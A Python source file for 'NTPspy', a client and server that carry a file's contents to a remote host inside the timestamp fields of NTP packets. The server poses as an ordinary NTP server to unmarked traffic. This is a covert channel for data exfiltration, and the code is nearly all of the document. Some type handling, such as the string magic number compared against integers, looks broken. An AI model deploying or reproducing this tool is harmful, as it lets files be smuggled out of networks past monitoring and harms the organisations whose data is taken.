import re
import socket
import struct
import argparse
import time
import os
import sys

DEFAULT_NTP_PORT = 123
DEFAULT_MAGIC_NUMBER = 0xDEADBEEF
NTPSPY_VERSION = 0x01
UNIX_TO_NTP = 2208988800

# NTP packet format (48 bytes)
# length (bits), NTP field name, NTPspy special purpose/values
# 2, LI, 0x3 = fatal error
# 3, VN, 0x3 = NTPv3
# 3, Mode, 0x4 = server mode, 0x3 = client mode
# 8, Stratum, 0xF = server mode, 0x10 = client mode
# 8, Polling interval = NTPspy opcode, 0x0 query NTPspy version, 0x1 transfer file
# 8, Precision, NTPspy protocol version
# 16, Root Delay, NTPspy magic number
# 16, Root Dispersion, (reserved)
# 32, Reference ID, transfer session ID
# 32, Reference Timestamp, [0:31] seconds, [32:63] payload sequence number
# 32, Originate Timestamp, [0:31] seconds, [32:63] hidden payload data
# 32, Receive Timestamp, normal NTP timestamp
# 32, Transmit Timestamp, normal NTP timestamp

class NTPpacket:
    def __init__(self, data=None):
        self.LI = 0
        self.VN = 3
        self.mode = 0
        self.stratum = 0
        self.poll = 0
        self.precision = 0
        self.rootdelay = 0
        self.rootdispersion = 0
        self.refid = 0
        self.reftime_sec = 0
        self.reftime_frac = 0
        self.origtime_sec = 0
        self.origtime_frac = 0
        self.recvtime_sec = 0
        self.recvtime_frac = 0
        self.transtime_sec = 0
        self.transtime_frac = 0
        if data:
            self.unpack(data)

    def unpack(self, data):
        unpacked = struct.unpack("!B B B B 11I", data)
        self.LI = (unpacked[0] >> 6) & 0x3
        self.VN = (unpacked[0] >> 3) & 0x7
        self.mode = unpacked[0] & 0x7
        self.stratum = unpacked[1]
        self.poll = unpacked[2]
        self.precision = unpacked[3]
        self.rootdelay = unpacked[4]
        self.rootdispersion = unpacked[5]
        self.refid = unpacked[6]
        self.reftime_sec = unpacked[7]
        self.reftime_frac = unpacked[8]
        self.origtime_sec = unpacked[9]
        self.origtime_frac = unpacked[10]
        self.recvtime_sec = unpacked[11]
        self.recvtime_frac = unpacked[12]
        self.transtime_sec = unpacked[13]
        self.transtime_frac = unpacked[14]

    def pack(self):
        return struct.pack(
            "!B B B B 11I",
            (self.LI << 6) | (self.VN << 3) | self.mode,
            self.stratum,
            self.poll,
            self.precision,
            self.rootdelay,
            self.rootdispersion,
            self.refid,
            self.reftime_sec,
            self.reftime_frac,
            self.origtime_sec,
            self.origtime_frac,
            self.recvtime_sec,
            self.recvtime_frac,
            self.transtime_sec,
            self.transtime_frac
        )

    def is_ntpspy(self, magic_number):
        return self.rootdelay == magic_number

class NTPspyMessage:
    def __init__(self, session_id=0, sequence_number=0, payload=0, opcode=0):
        self.session_id = session_id
        self.sequence_number = sequence_number
        self.payload = payload
        self.opcode = opcode
        self.version = NTPSPY_VERSION
        self.status = 0
        self.magic = DEFAULT_MAGIC_NUMBER

    def from_ntp(self, ntp_packet):
        self.session_id = ntp_packet.refid
        self.sequence_number = ntp_packet.reftime_frac
        self.payload = ntp_packet.transtime_frac
        self.opcode = ntp_packet.poll
        self.version = ntp_packet.precision
        self.status = ntp_packet.LI
        self.magic = ntp_packet.rootdelay

    def to_ntp(self):
        packet = NTPpacket()
        packet.LI = self.status
        packet.refid = self.session_id
        packet.reftime_frac = self.sequence_number
        packet.transtime_frac = self.payload
        packet.poll = self.opcode
        packet.precision = self.version
        packet.rootdelay = self.magic
        return packet

class NTPServer:
    def __init__(self, args):
        self.port = args.p
        self.storage_path = args.s if os.path.isdir(args.s) else os.getcwd()
        self.magic_number = args.m
        self.verbose = True if args.v else False

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("", self.port))
        if self.verbose:
            print(f"NTPspy version {NTPSPY_VERSION} listening on port {self.port}, storing files in {self.storage_path}, magic number: {self.magic_number}")
        
        try:
            while True:
                data, addr = sock.recvfrom(48)
                ntp_in = NTPpacket(data)

                request_type = "NTPspy" if ntp_in.is_ntpspy(self.magic_number) else "Standard"
                if self.verbose:
                    print(f"{addr[0]}:Received request, type: {request_type}")
                
                if ntp_in.is_ntpspy(self.magic_number):
                    #print(vars(ntp_in))
                    response = self.handle_ntpspy(ntp_in)
                else:
                    response = self.handle_standard(ntp_in)
                response.mode = 4  # server mode
                
                sock.sendto(response.pack(), addr)
        except KeyboardInterrupt:
            print("Server shutting down...")
        finally:
            sock.close()

    # mimic standard NTP server behavior for non-NTPspy datagrams
    def handle_standard(self, request):

        response = NTPpacket()
        response.mode = 4  # server mode
        response.stratum = 15  # server mode
        response.transtime_sec = int(time.time()) + UNIX_TO_NTP 

        if self.verbose:
            print(f"Response type: standard NTP, timestamp: {response.transtime_sec}")
        
        return response

    # handle incoming NTPspy messages
    def handle_ntpspy(self, ntp):

        message = NTPspyMessage()
        message.from_ntp(ntp)
        
        if self.verbose:
            print(f"Received request, type: NTPspy, function: {message.opcode}")
        
        if message.opcode == 0:
            response = self.handle_query(message)
        elif message.opcode == 1:
            response = self.handle_transfer(message)
            
        reply = response.to_ntp()
        return reply

    # identify ourselves as an NTPspy server
    def handle_query(self, message):
        if self.verbose:
            print("Responding to version probe")
        response = NTPspyMessage()
        response.opcode = 0x0
        response.session_id = 0
        response.sequence_number = 0
        response.payload = 0
        response.version = NTPSPY_VERSION
        response.status = 0
        response.magic = self.magic_number
        return response
    
    # processing incoming file transfer
    def handle_transfer(self, message):
        if self.verbose:
            print("Received file transfer message")
        response = NTPspyMessage()
        if message.session_id == 0:
            if self.verbose:
                print("New file transfer session")
            # TODO generate new session ID
            # for now, send poison pill to abort transfer
            response.opcode = message.opcode
            response.status = 0x3
            return response
        else:
            # process incoming file data
            # filename = {storage_path}/{session_id}.dat
            # offset = sequence_number * 4
            # write payload to file at offset
            if self.verbose:
                print(f"Received data for session {hex(message.session_id)}, sequence: {message.sequence_number}, payload: {hex(message.payload)}")
            filename = f"{self.storage_path}/{hex(message.session_id)}.dat"
            # ensure file exists
            if not os.path.exists(filename):
                with open(filename, "wb") as f:
                    pass
            with open(filename, "r+b") as f:
                f.seek(message.sequence_number * 4)
                f.write(struct.pack("!I", message.payload))

            # send ack
            response = message
            return response
        
class NTPClient:
    def __init__(self, args):
        self.server_ip = args.remote
        self.verbose = True if args.v else False
        self.session_id = args.d if args.d else DEFAULT_MAGIC_NUMBER
        self.port = args.p if args.p else DEFAULT_NTP_PORT
        self.magic_number = args.m if args.m else DEFAULT_MAGIC_NUMBER

    def query_server(self, remote):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        ntp_timestamp = int(time.time()) + UNIX_TO_NTP
        fractional = 0  # reserved
        
        request = struct.pack(
            "!B B B B 11I",
            0x1B,  # LI=0, Version=3, Mode=3 (client)
            16, 0, NTPSPY_VERSION,  # Stratum 16, Poll, Precision
            self.magic_number, 0,  # Root Delay, Root Dispersion (using magic number)
            0,  # Reference ID
            ntp_timestamp, fractional,  # Reference Timestamp
            ntp_timestamp, fractional,  # Originate Timestamp
            ntp_timestamp, fractional,  # Receive Timestamp
            ntp_timestamp, fractional   # Transmit Timestamp
        )
        
        sock.sendto(request, (self.server_ip, self.port))
        if self.verbose:
            print(f"Sent NTPspy query to {self.server_ip}:{self.port}")
        
        response, _ = sock.recvfrom(48)
        if self.verbose:
            print("Received NTP response")
        
        # unpack response
        _, _, _, precision, *_ = struct.unpack("!B B B B 11I", response)
        
        if precision == NTPSPY_VERSION:
            print(f"NTPspy server detected with protocol version {precision}")
        else:
            print("Not NTPspy server or protocol version mismatch")
        
        return precision == NTPSPY_VERSION

    def upload(self, remote, filename):
        if not self.query_server(remote):
            return
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        with open(filename, "rb") as f:
            sequence_number = 0
            while True:
                segment = f.read(4)
                if not segment:
                    break
                
                # session ID to integer
                #session_id_int = int.from_bytes(self.session_id.encode(), 'big')
                session_id_int = int(self.session_id, 16)
                # segment to integer
                #payload = int.from_bytes(segment, 'big')
                payload = int(segment.hex(), 16)
                
                ntp_timestamp = int(time.time()) + UNIX_TO_NTP
                fractional = 0  # Placeholder for now
                
                request = struct.pack(
                    "!B B B B 11I",
                    0x1B,  # LI=0, Version=3, Mode=3 (client)
                    16, 0x1, NTPSPY_VERSION,  # Stratum 16, Poll = opcode, Precision = protocol version
                    self.magic_number, 0,  # Root Delay = magic number, Root Dispersion = reserved
                    session_id_int,  # Reference ID
                    ntp_timestamp, sequence_number,  # Reference Timestamp
                    ntp_timestamp, fractional,  # Originate Timestamp
                    ntp_timestamp, fractional,  # Receive Timestamp
                    ntp_timestamp, payload   # Transmit Timestamp
                )
                
                sock.sendto(request, (self.server_ip, self.port))
                if self.verbose:
                    print(f"Sent NTPspy packet to {self.server_ip}:{self.port}, session: {session_id_int} sequence_number: {sequence_number}, payload: {hex(payload)}")
                
                reply, _ = sock.recvfrom(48)
                response = NTPpacket(reply)
                #print(vars(response))
                if response.LI == 0x3:
                    print("Fatal error, aborting transfer")
                    break
                if self.verbose:
                    print("Received NTP response")
                ack = NTPspyMessage()
                ack.from_ntp(response)
                if ack.sequence_number == sequence_number and ack.payload == payload:
                    print(f"Received ACK for sequence number {sequence_number}")
                else:
                    print(f"ACK mismatch, expected {sequence_number}, got {ack.sequence_number}")
                    # TODO retry up to max attempts
                    break
                sequence_number += 1

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NTPspy - NTP based file transfer utility")
    parser.add_argument("-s", type=str, help="Server mode <storage path>")
    parser.add_argument("-p", type=int, default=DEFAULT_NTP_PORT, help="Port number")
    parser.add_argument("-m", type=str, default=DEFAULT_MAGIC_NUMBER, help="Magic number (hex 1-FFFFFFFF)")
    parser.add_argument("-v", action="store_true", help="Verbose mode")
    parser.add_argument("-q", action="store_true", help="Query server for NTPspy protocol version")
    parser.add_argument("-d", type=str, help="Transfer session ID (hex 1-FFFFFFFF)")
    #parser.add_argument("-t", type=int, help="Minimum interval (ms) (client only)")
    #parser.add_argument("-x", action="store_true", help="Obfuscate payload (client only)")
    parser.add_argument("remote", type=str, nargs='?', help="server IP (client only)")
    parser.add_argument("filename", type=argparse.FileType('r'), nargs='?', help="Filename to transfer (client only)")

    args = parser.parse_args()
    if args.d:
        if not (len(args.d) <= 8 and all(c in '0123456789abcdefABCDEF' for c in args.d)):
            parser.error("Session ID must be hex 1 - FFFFFFFF")
            sys.exit(1)
    if args.p:
        if not (0 < args.p < 65536):
            parser.error("Port number must be 1 - 65535")
            sys.exit(1)

    if args.s:
        # server mode
        server = NTPServer(args)
        server.start()
    else:
        # client mode
        if not args.remote or not args.filename:
            parser.error("Remote IP and filename required in client mode")
            sys.exit(1)
        client = NTPClient(args)
        if args.q:
            client.query_server(args.remote)
        else:
            print(f"Uploading {args.filename.name} to {args.remote}")
            print(f"Session ID: {args.d}")
            client.upload(args.remote, args.filename.name)